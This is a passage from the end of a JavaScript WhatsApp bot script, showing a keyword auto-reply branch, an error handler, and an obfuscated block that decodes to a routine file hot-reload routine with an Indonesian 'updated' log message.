if (!(budy.toLowerCase() in msgs)) return
zeroyt7.copyNForward(from, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
zeroyt7.sendMessage(m.key.remoteJid, { text: `*[ERROR !!!]*\n${err}` }, { quoted: m })
}
}

const _0x4fb9e4=_0x1df3;(function(_0x2b13ba,_0x5a20ca){const _0x7e97f5=_0x1df3,_0x3c41da=_0x2b13ba();while(!![]){try{const _0x354a4f=parseInt(_0x7e97f5(0x1c5))/(0xbc*0x2+-0x1c1f*-0x1+0xecb*-0x2)*(parseInt(_0x7e97f5(0x1b4))/(-0x10d*0x9+0x58d+0x3ea))+parseInt(_0x7e97f5(0x1b5))/(-0xe2b+0x1*0x1e28+-0xffa)*(parseInt(_0x7e97f5(0x1b9))/(-0xd*-0x296+0x1d07+0x1*-0x3ea1))+parseInt(_0x7e97f5(0x1b8))/(-0x578+0x28f*0x1+0xa*0x4b)+-parseInt(_0x7e97f5(0x1c4))/(-0x13d*0xb+0x12c8+0x107*-0x5)+-parseInt(_0x7e97f5(0x1b6))/(-0x47*0x7+0x213f+-0x1f47)+-parseInt(_0x7e97f5(0x1ba))/(0x23ed+-0x14*0x1e1+0x1af)*(-parseInt(_0x7e97f5(0x1bb))/(-0xe*0x179+0x2f*-0x9a+-0xf*-0x343))+parseInt(_0x7e97f5(0x1bf))/(0x119*0x1a+0x881*0x1+-0x2501);if(_0x354a4f===_0x5a20ca)break;else _0x3c41da['push'](_0x3c41da['shift']());}catch(_0x4013bd){_0x3c41da['push'](_0x3c41da['shift']());}}}(_0x1d7b,0x1cd4c+-0x63814+0xce34f));let file=require[_0x4fb9e4(0x1b7)](__filename);function _0x1df3(_0x572077,_0x2c319e){const _0x250692=_0x1d7b();return _0x1df3=function(_0x5978d8,_0x549f71){_0x5978d8=_0x5978d8-(-0x26fb+0x12df+0x15cf);let _0x212a3f=_0x250692[_0x5978d8];return _0x212a3f;},_0x1df3(_0x572077,_0x2c319e);}fs[_0x4fb9e4(0x1c0)](file,()=>{const _0x55f274=_0x4fb9e4,_0x364522={'DyBxh':function(_0x1ea4e8,_0x94c63d){return _0x1ea4e8(_0x94c63d);}};fs[_0x55f274(0x1be)+'e'](file),console[_0x55f274(0x1c3)](chalk[_0x55f274(0x1c2)](__filename+(_0x55f274(0x1bd)+_0x55f274(0x1c1)))),delete require[_0x55f274(0x1bc)][file],_0x364522[_0x55f274(0x1b3)](require,file);});function _0x1d7b(){const _0x7d86c=['watchFile','Update','blue','log','4363284XOEpZH','36451WENywJ','DyBxh','6czktnP','3KNIwVE','3516114PwMPzd','resolve','3315695OKHlvH','2250520NQbHbK','808ZNgqbp','35298gvMXAj','cache','\x20Telah\x20Di\x20','unwatchFil','534150hWYltP'];_0x1d7b=function(){return _0x7d86c;};return _0x1d7b();}
